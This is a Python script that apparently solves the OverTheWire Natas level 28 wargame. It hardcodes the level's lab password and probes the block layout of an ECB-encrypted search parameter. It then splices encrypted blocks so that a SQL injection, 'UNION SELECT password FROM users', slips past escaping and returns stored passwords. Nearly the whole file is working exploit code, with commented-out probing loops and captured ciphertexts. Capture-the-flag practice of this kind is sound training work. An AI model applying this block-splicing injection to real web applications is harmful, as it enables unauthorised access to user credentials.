#!/usr/bin/env python

import requests
import re
import urllib
import base64
from string import *
from time import *

characters = lowercase + uppercase + digits
#print characters

username = 'natas28'
password = 'JWwR438wkgTsNKBbcJoowyysdM82YjeF'


url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()

block_size = 16
#response = session.get(url, auth = (username, password) )
#for i in range(80):
#	response = session.post(url,auth = (username, password),
#							data = {"query":"a"*i})
#	print "query_length:", i, ", response_length", len(base64.b64decode(requests.utils.unquote(response.url[60:])))
			#
			#
#	print '='*50
#	for block in range(80/block_size):
#		print "block", block+1, "data", repr(base64.b64decode(requests.utils.unquote(response.url[60:]))[block*block_size:(block+1)*block_size])
#print repr(base64.b64decode(requests.utils.unquote(response.url[60:])))
#print base64.b64decode(requests.utils.unquote(response.url[60:]))
#print requests.utils.unquote(response.url[60:])


#import string 
#
#correct_string = repr('\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb')
#
#for c in string.printable:
#	print "trying", c
#	response = session.post(url,auth = (username, password),
#							data = {"query":"a"*8 + '%' + c})
#	block = 2  #0 based.....
#	answer = repr(base64.b64decode(requests.utils.unquote(response.url[60:])))
#	if answer == correct_string:
#		print "WE FOUND THE CHARACTER", c
#

# SELECT text FROM jokes WHERE text LIKE '%input%'
injection = 'a'*9 + "' UNION SELECT password FROM users; #"

blocks = (len(injection) - 10 ) / block_size
if ( len(injection) - 10 ) % block_size != 0: blocks += 1
print blocks

response = session.post (url, auth = (username, password), 
					data = {"query" :injection})

raw_inject = base64.b64decode(requests.utils.unquote(response.url[60:]))
#print repr(raw_inject)

response = session.post(url,auth = (username, password),
							data = {"query":'a'*10})

good_base = base64.b64decode(requests.utils.unquote(response.url[60:]))

query = good_base[:block_size*3:] + raw_inject[block_size*3:block_size*3+(blocks*block_size)] + good_base[block_size*3:] 
query =  requests.utils.quote(base64.b64encode(query)).replace('/', '%2F')

response = session.get(url + '/search.php/?query=' + query, auth = (username, password) )
print response.text

#print response.text

#G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
#G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPK7We8ZytjDEFLITTM3cIDRKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=
#G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKeURC3dWbZVbvtyoxuV6Qsmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo=